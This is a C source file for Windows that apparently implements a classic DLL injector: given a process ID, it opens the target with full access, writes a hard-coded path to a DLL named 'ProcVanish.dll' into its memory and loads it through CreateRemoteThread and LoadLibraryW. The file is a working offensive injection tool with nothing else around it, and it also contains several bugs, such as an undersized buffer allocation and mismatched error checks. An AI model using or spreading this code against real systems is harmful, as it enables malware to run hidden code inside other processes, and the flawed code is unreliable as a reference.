#include <Windows.h>
#include <stdio.h>

#define LOG_FILE L"C:\\Users\\cappy\\Desktop\\Logs.txt"

void WriteLog(const wchar_t* format, ...) {
	va_list args;
	va_start(args, format);

	// Calculate the required buffer size for the formatted string
	int len = vswprintf(NULL, 0, format, args);

	va_end(args);

	if (len > 0) {
		HANDLE hfile = CreateFileW(LOG_FILE, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hfile != INVALID_HANDLE_VALUE) {
			va_start(args, format);
			// Allocate enough space for the formatted string plus a null terminator
			wchar_t* buffer = (wchar_t*)malloc(len + 2);
			vswprintf(buffer, len + 2, format, args); // Write the formatted string to the buffer
			va_end(args);

			DWORD written;
			WriteFile(hfile, buffer, wcslen(buffer) * 2, &written, NULL);
			WriteFile(hfile, L"\r\n", 4, &written, NULL);
			free(buffer); // Free the allocated buffer
			CloseHandle(hfile);
		}
		else {
			// Handle error
			LPVOID lpMsgBuf;
			DWORD dw = GetLastError();
			FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL, dw, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
				(LPTSTR)&lpMsgBuf, 0, NULL);

			WriteLog(L"Failed to create log file. Error: ");
			WriteLog((char*)lpMsgBuf);
			LocalFree(lpMsgBuf);
		}
	}
}

int main(int argc, char *argv[]) {

	HANDLE hProcess = NULL;
	PVOID remoteBuff = NULL;
	wchar_t dllPath[] = TEXT("C:\\Users\\cappy\\Documents\\Projects\\Dlls\\ProcVanish\\x64\\Release\\ProcVanish.dll");

	if (argc < 2) {
		printf("[*] USAGE: \"%s\" <PID>\n", argv[0]);
	}

	

	// open handle to process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
	if (hProcess == INVALID_HANDLE_VALUE) {
		printf("[!] OpenProcess failed with error : %d\n", GetLastError());
		return -1;
	}
	printf("[+] Found remote process\n");

	// Allocate mem in the target proc
	remoteBuff = VirtualAllocEx(hProcess, NULL, sizeof(dllPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteBuff == NULL) {
		printf("[!] VirtualAllocEx failed with error : %d\n", GetLastError());
		return -1;
	}
	printf("[+] Successfully Allocated Memory At 0x%p\n", remoteBuff);


	// Write the DLL path to othe allocated memory
	if (!WriteProcessMemory(hProcess, remoteBuff, (LPVOID)dllPath, sizeof(dllPath), NULL)) {
		printf("[!} WriteProcessMem failed %d\n", GetLastError());
		return -1;
	}
	printf("[+] Successfully Wrote Dll Path\n");

	// Load the dll into the target process
	PTHREAD_START_ROUTINE start = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	if (!CreateRemoteThread(hProcess, NULL, 0, start, remoteBuff, 0, NULL)) {
		printf("[!] CreateRemoteThread Failed with error : %d\n");
		return -1;
	}
	printf("[+] Dll Executed\n");

	printf("[#] Press Enter To Quit\n");
	getchar();

	CloseHandle(hProcess);
	return 0;
}